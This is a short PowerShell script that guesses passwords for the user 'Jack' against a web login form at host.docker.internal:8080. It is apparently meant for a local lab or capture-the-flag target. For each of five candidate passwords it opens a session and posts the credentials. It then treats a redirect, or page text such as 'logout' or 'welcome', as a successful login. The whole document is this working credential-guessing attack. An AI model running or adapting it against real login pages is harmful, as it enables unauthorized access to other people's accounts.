param([string]$Base="http://host.docker.internal:8080/")
$User="Jack"
$Candidates = @("wrong1","Password1!","admin","123456","HvvG5JSD9z")

foreach($p in $Candidates){
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-WebRequest "$($Base)login.html" -WebSession $s -UseBasicParsing | Out-Null

  # Do NOT auto-follow; we want to see a 302 on success
  $resp = $null
  try{
    $resp = Invoke-WebRequest "$($Base)login.html" -WebSession $s -UseBasicParsing -Method POST `
            -MaximumRedirection 0 `
            -ContentType "application/x-www-form-urlencoded" `
            -Body ("username={0}&password={1}" -f [uri]::EscapeDataString($User),[uri]::EscapeDataString($p))
  }catch{
    $resp = $_.Exception.Response
  }

  $status = try { [int]$resp.StatusCode } catch { 0 }
  $loc    = try { $resp.Headers['Location'] } catch { $null }

  $success = $false
  if($status -in 301,302,303,307,308 -and $loc){
    # follow one hop to confirm authenticated marker
    try{
      $follow = Invoke-WebRequest (([uri]$Base,$loc -join '')) -WebSession $s -UseBasicParsing -TimeoutSec 10
      $success = ($follow.Content -match '(?i)logout|welcome|order')
    }catch{}
  }else{
    # some apps render the dashboard directly
    $success = ($resp -and $resp.Content -match '(?i)logout|welcome|order')
  }

  "{0} -> {1}" -f $p, ($(if($success){"SUCCESS"}else{"FAIL"}))
}
